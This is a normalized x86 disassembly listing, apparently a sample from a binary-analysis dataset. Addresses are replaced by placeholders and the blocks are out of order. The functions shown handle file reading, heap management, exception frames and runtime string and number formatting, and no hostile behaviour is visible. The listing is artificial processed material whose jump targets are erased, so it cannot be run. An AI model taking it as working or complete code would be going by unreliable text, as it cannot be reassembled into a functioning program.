cmp [ esp + 0x40 ] 0x8
jb r-xdata
mov esi [ esp + 0x14 ]
mov eax [ esi ]
test eax eax
je r-xdata
push 0x0
push esi
call [ GetFileSize@IAT ]
mov [ edi ] eax
cmp eax 0xffffffff
je r-xdata
mov [ esp + 0x10 ] 0x3
jmp r-xdata
push 0x3e8
call esi
cmp [ esp + 0x24 ] 0x0
je r-xdata
mov eax ebx
mov edx [ esp + 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi ] 0x0
mov [ edi ] 0x0
mov [ esp + 0x10 ] 0x4
test eax eax
je r-xdata
push eax
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov ecx [ esp + 0x14 ]
push 0x0
lea edx [ esp + 0x20 ]
push edx
mov [ ecx ] eax
mov ecx [ edi ]
push ecx
push eax
push esi
mov [ esp + 0x30 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0x5
jmp r-xdata
mov edx [ edi ]
cmp edx [ esp + 0x1c ]
jne r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
mov [ eax ] 0xc8
jmp r-xdata
sub_10064ee0
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x10 ]
push eax
push esi
call sub_10028ff0
lea ecx [ edi + 0x20 ]
push ecx
push esi
call sub_10028ff0
push edi
push esi
call sub_1006db40
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_10064f10
push ebp
mov ebp esp
push 0xffffffff
push sub_10086448
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_1000c927
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10004aa4
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003c9c
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1001df00
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_100661c2
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10055e2a
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
push esi
call sub_10008715
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1006504a
mov edi edi
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1000f103
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_10054390
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x18
sub_100650a7
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002b11f
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_100650d7
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_1005ece8
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10065102
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
push esi
push edi
push [ ebp + 0x8 ]
call sub_1007fa40
lea esi [ eax + 0x1 ]
push esi
call sub_10021090
mov edi eax
pop ecx
pop ecx
cmp edi ebx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
push [ ebp + 0x8 ]
push esi
push edi
call sub_10042442
add esp 0xc
test eax eax
jne r-xdata
pop ebx
pop ebp
retn
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_1005aa2b
mov eax edi
jmp r-xdata
pop edi
pop esi
sub_10065154
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10004190
push 0xffffffff
push eax
call sub_1005bd10
jmp r-xdata
pop ebp
retn 0x8
sub_10065180
cmp edi ebx
je r-xdata
mov eax edi
retn
mov eax [ edi + 0x4 ]
dec [ eax ]
jne r-xdata
mov eax [ ebx ]
mov [ edi ] eax
mov eax [ ebx + 0x4 ]
mov [ edi + 0x4 ] eax
inc [ eax ]
push esi
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ edi + 0x4 ]
pop esi
test eax eax
je r-xdata
call sub_100324d0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_100651be
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
call sub_10032538
push r--data
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] r--data
call sub_10055e2a
int3
sub_100651f0
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
push esi
xor eax eax
push edi
mov edi [ ebp + 0x10 ]
mov [ esp + 0xc ] ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp edi eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ esp + 0xc ]
call sub_10068490
mov ebx edx
mov esi eax
test ebx ebx
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov ecx [ esp + 0xc ]
mov edx [ ecx ]
mov eax [ edx + 0x1c ]
call eax
movzx ecx ax
mov edx 0xffff
cmp dx cx
je r-xdata
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax 0x2
add [ esp + 0x10 ] 0x1
mov [ eax - 0x2 ] cx
mov [ ebp + 0x8 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] 0xffffffff
adc edi 0xffffffff
mov [ ebp + 0x10 ] edi
cmp edi ebx
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ esp + 0xc ]
mov ecx [ eax + 0x20 ]
mov edx [ ecx ]
mov eax [ ebp + 0x8 ]
lea edi [ esi + esi ]
push edi
push edx
push eax
call sub_1007f580
add [ ebp + 0x8 ] edi
mov eax [ esp + 0x18 ]
mov ecx [ eax + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] ebx
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] ebx
sub [ ecx ] esi
mov eax [ eax + 0x20 ]
add [ eax ] edi
mov edi [ ebp + 0x10 ]
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
test edi edi
jg r-xdata
mov esi [ ebp + 0xc ]
mov ebx edi
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_100652f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10087e11
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x34 ] edi
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] 0x4
mov [ edi + 0x10 ] eax
mov ecx 0x7
mov [ edi + 0x14 ] ecx
xor edx edx
mov [ edi ] dx
mov [ edi + 0x30 ] ecx
mov [ edi + 0x2c ] eax
mov [ edi + 0x1c ] dx
mov [ edi + 0x50 ] ecx
mov [ edi + 0x4c ] eax
mov [ edi + 0x3c ] dx
mov [ edi + 0x6c ] ecx
mov [ edi + 0x68 ] eax
mov [ edi + 0x58 ] ax
cmp [ ebp + 0x1c ] 0x10
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x1
jae r-xdata
mov ecx [ ebp + 0x18 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10068a40
add esp 0x4
push eax
lea ecx [ edi + 0x1c ]
mov [ ebp - 0x4 ] 0x5
call sub_10033f90
mov ebx 0x8
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x8 ]
mov eax [ ebp + 0x5c ]
mov esi 0x10
cmp [ ebp + 0x70 ] esi
jae r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_1000a86e
add esp 0x4
push eax
call [ StrToIntA@IAT ]
mov [ edi + 0x38 ] ax
mov eax [ ebp + 0x24 ]
cmp [ ebp + 0x38 ] esi
jae r-xdata
lea eax [ ebp + 0x5c ]
mov ecx [ ebp + 0x34 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10068a40
add esp 0x4
push eax
lea ecx [ edi + 0x3c ]
mov [ ebp - 0x4 ] 0x6
call sub_10033f90
mov [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x24 ]
cmp [ ebp + 0x54 ] 0x10
mov eax [ ebp + 0x40 ]
jae r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_1000a86e
add esp 0x4
mov ecx [ ebp + 0x50 ]
push eax
lea esi [ ebp - 0x2c ]
call sub_10068a40
add esp 0x4
push eax
lea ecx [ edi + 0x58 ]
mov [ ebp - 0x4 ] 0x7
call sub_10033f90
cmp [ ebp - 0x18 ] ebx
jb r-xdata
lea eax [ ebp + 0x40 ]
cmp [ ebp + 0x1c ] 0x10
mov ecx [ ebp + 0x78 ]
mov [ edi + 0x78 ] ecx
mov [ edi + 0x7c ] 0x1
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor esi esi
cmp [ ebp + 0x38 ] 0x10
mov ebx 0xf
mov [ ebp + 0x1c ] ebx
mov [ ebp + 0x18 ] esi
mov [ ebp + 0x8 ] 0x0
jb r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_1000a86e
add esp 0x4
cmp [ ebp + 0x54 ] 0x10
mov [ ebp + 0x38 ] ebx
mov [ ebp + 0x34 ] esi
mov [ ebp + 0x24 ] 0x0
jb r-xdata
mov eax [ ebp + 0x24 ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ ebp + 0x70 ] 0x10
mov [ ebp + 0x54 ] ebx
mov [ ebp + 0x50 ] esi
mov [ ebp + 0x40 ] 0x0
jb r-xdata
mov ecx [ ebp + 0x40 ]
push ecx
call sub_1000a86e
add esp 0x4
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x5c ]
push edx
call sub_1000a86e
add esp 0x4
sub_100654c7
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x23c ] eax
call sub_10051cf5
call sub_1005b670
mov [ ebp - 0x26c ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor ecx ecx
cmp ebx ecx
je r-xdata
push esi
call sub_10063a9a
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] ecx
mov [ ebp - 0x248 ] ecx
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc ebx
xor esi esi
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x274 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x274 ]
mov edi [ ebp - 0x21c ]
mov dl al
jmp r-xdata
sub_100660f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1006a3ae
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_10001b6d
test eax eax
movsx eax [ esi ]
push eax
call sub_1006a3ae
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_10066170
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x28
je r-xdata
lea ecx [ esi + 0x24 ]
push ecx
push edi
call sub_1001cd60
add esp 0x8
cmp eax 0x29
je r-xdata
cmp eax 0x18
jne r-xdata
push esi
push edi
call sub_1006db40
add esp 0x8
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x18 ]
push eax
push edi
call sub_1006db40
add esp 0x8
push esi
push edi
call sub_1006db40
add esp 0x8
pop edi
pop esi
pop ebp
retn
sub_100661c2
mov edi edi
push ebp
mov ebp esp
push esi
lea eax [ ebp + 0x8 ]
push eax
mov esi ecx
call sub_10032538
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100661e0
push 0x14
push r--data
call sub_1007fad0
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x18 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] edi
setne al
cmp eax edi
je r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
call sub_1004b131
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] edi
je r-xdata
call sub_1007fb15
retn
mov [ ebp - 0x4 ] edi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax esi
call sub_1007fc48
add esp 0x14
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10066276
mov eax [ ebp - 0x20 ]
cmp eax edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
or [ esi ] 0xffffffff
sub_10066276
cmp [ ebp - 0x1c ] edi
je r-xdata
retn
cmp [ ebp - 0x20 ] edi
je r-xdata
push [ esi ]
call sub_1002e42c
pop ecx
mov eax [ esi ]
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
mov ecx [ ecx * 4 + rw-data ]
lea eax [ ecx + eax + 0x4 ]
and [ eax ] 0xfe
sub_100662b0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086858
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
mov edi ecx
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1003e780
mov eax [ ebp + 0x8 ]
push eax
push edi
lea ecx [ ebp - 0x34 ]
push ecx
push ebx
mov [ ebp - 0x4 ] ebx
call sub_1005f240
add esp 0x10
cmp eax 0xffffffd6
jne r-xdata
push ebx
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push r--data
mov ecx esi
mov [ esi ] bl
call sub_1003e780
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x34 ]
cmp eax ebx
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x2c ]
push ecx
push eax
call sub_1002b2d3
mov edx [ ebp + 0x8 ]
push edx
push edi
lea ecx [ ebp - 0x34 ]
push ecx
push eax
mov [ ebp - 0x30 ] eax
call sub_1005f240
mov edi [ ebp - 0x30 ]
add esp 0x14
test eax eax
jne r-xdata
push edi
call sub_10019274
add esp 0x4
lea edx [ ebp - 0x2c ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
push edx
mov ecx esi
mov [ esi ] bl
call sub_1003acf0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax edi
lea edx [ eax + 0x1 ]
mov eax [ ebp - 0x2c ]
push eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
push edi
lea ecx [ ebp - 0x2c ]
call sub_1003e780
call sub_1000a86e
add esp 0x4
sub_100663ce
mov edi edi
push ebp
mov ebp esp
cmp [ r--data ] 0x0
je r-xdata
call sub_1002914f
push r--data
push r--data
call sub_10051a3c
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
call sub_1005aae0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_10002afd
call sub_10064546
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ r--data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_1005aae0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_10066465
push 0x80
mov eax sub_10085323
call sub_10047689
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x18 ]
mov esi [ ebp + 0x20 ]
mov [ ebp - 0x54 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x8c ] eax
mov al [ ebp + 0x1c ]
mov [ ebp - 0x7c ] al
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x2c ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp + 0x30 ]
mov [ ebp - 0x50 ] eax
lea eax [ ebp - 0x84 ]
push eax
mov ecx edi
call sub_10007a10
and [ ebp - 0x4 ] 0x0
push eax
call sub_10067ab7
or [ ebp - 0x4 ] 0xffffffff
pop ecx
mov ebx eax
lea ecx [ ebp - 0x84 ]
mov [ ebp - 0x68 ] ebx
call sub_1002be90
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_10026407
mov eax [ ebx ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x8 ]
xor ebx ebx
mov [ ebp - 0x80 ] al
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov al [ esi ]
mov [ ebp - 0x4 ] 0x2
cmp al 0x2b
je r-xdata
mov [ ebp - 0x78 ] 0x1
mov [ ebp - 0x78 ] ebx
cmp al 0x2d
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x58 ] ebx
call sub_1003d7d5
mov eax [ eax ]
push [ ebp - 0x50 ]
mov al [ eax ]
push 0x65
push esi
mov [ ebp - 0x60 ] al
mov [ ebp - 0x5f ] 0x65
call sub_1007f310
push [ ebp - 0x50 ]
mov [ ebp - 0x70 ] eax
movsx eax [ ebp - 0x60 ]
push eax
push esi
call sub_1007f310
add esp 0x18
mov [ ebp - 0x4c ] eax
cmp eax ebx
jne r-xdata
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x58 ]
add eax [ ebp - 0x50 ]
mov ecx [ edi + 0x20 ]
add eax [ ebp - 0x64 ]
add eax [ ebp - 0x5c ]
cmp [ edi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
mov [ ebp - 0x4c ] ebx
jg r-xdata
cmp [ eax ] 0x0
jle r-xdata
lea eax [ ebp - 0x48 ]
movsx eax [ ebp - 0x60 ]
push [ ebp - 0x50 ]
push eax
push esi
call sub_1007f310
add esp 0xc
cmp eax ebx
je r-xdata
cmp eax 0x100
jne r-xdata
cmp ecx eax
jbe r-xdata
cmp ecx ebx
jbe r-xdata
push [ ebp - 0x50 ]
lea ecx [ ebp - 0x2c ]
push esi
call sub_10012830
mov eax [ ebp - 0x70 ]
cmp eax ebx
jne r-xdata
push [ ebp - 0x50 ]
push 0x65
push esi
call sub_1007f310
add esp 0xc
cmp eax ebx
je r-xdata
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_1000f514
mov ecx [ eax ]
push [ ebp - 0x5c ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_10019146
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov ecx [ ebp - 0x68 ]
mov [ ebp + 0x14 ] eax
mov eax [ ecx ]
add esp 0x34
call [ eax + 0x4 ]
mov [ ebp - 0x68 ] al
mov eax [ ebp + 0x10 ]
push [ ebp - 0x68 ]
mov [ ebp - 0x88 ] eax
mov eax [ ebp + 0x14 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x84 ] eax
call sub_100637b6
push [ ebp - 0x64 ]
mov ecx [ ebp - 0x84 ]
mov eax [ ebp - 0x88 ]
push 0x30
push ecx
push eax
mov [ ebp + 0x10 ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
mov [ ebp + 0x14 ] ecx
call sub_10019146
mov ecx [ eax ]
sub [ ebp - 0x50 ] ebx
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
add esi ebx
mov [ ebp + 0x14 ] eax
xor ebx ebx
push [ ebp - 0x4c ]
lea eax [ ebp - 0x74 ]
push [ ebp - 0x7c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_10019146
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ ebp - 0x4c ] ebx
mov [ ebp + 0x14 ] eax
add esp 0x18
cmp [ ebp - 0x78 ] ebx
jbe r-xdata
sub ecx eax
mov [ ebp - 0x4c ] ecx
jmp r-xdata
cmp [ ebp - 0x4c ] ebx
jne r-xdata
push 0x30
push [ ebp - 0x58 ]
lea ecx [ ebp - 0x2c ]
call sub_10042a70
jmp r-xdata
push [ ebp - 0x80 ]
lea eax [ ebp - 0x6c ]
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_1000f514
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push eax
push [ ebp - 0x54 ]
call sub_10019146
mov ecx [ eax ]
push [ ebp - 0x4c ]
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
push [ ebp - 0x7c ]
mov [ ebp + 0x14 ] eax
push eax
push ecx
push [ ebp - 0x8c ]
mov [ edi + 0x20 ] ebx
push [ ebp - 0x54 ]
mov [ edi + 0x24 ] ebx
call sub_10019146
add esp 0x4c
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
push ebx
push 0x1
lea ecx [ ebp - 0x48 ]
call sub_10005b50
mov eax [ ebp - 0x8c ]
call sub_100262c3
retn
push [ ebp - 0x80 ]
sub eax esi
lea ebx [ eax + 0x1 ]
lea eax [ ebx - 0x1 ]
push eax
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x6c ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_1000f514
mov ecx [ eax ]
push [ ebp - 0x58 ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
push 0x30
mov [ ebp + 0x14 ] ecx
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
push eax
push [ ebp - 0x54 ]
call sub_10019146
mov ecx [ eax ]
and [ ebp - 0x58 ] 0x0
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x34
test [ edi + 0x14 ] 0x4
mov [ ebp + 0x14 ] ecx
mov ecx r--data
jne r-xdata
push 0x1
push esi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x74 ]
push [ ebp + 0x10 ]
push eax
push [ ebp - 0x54 ]
call sub_100293e8
mov ecx [ eax ]
add esp 0x18
mov [ ebp + 0x10 ] ecx
mov eax [ eax + 0x4 ]
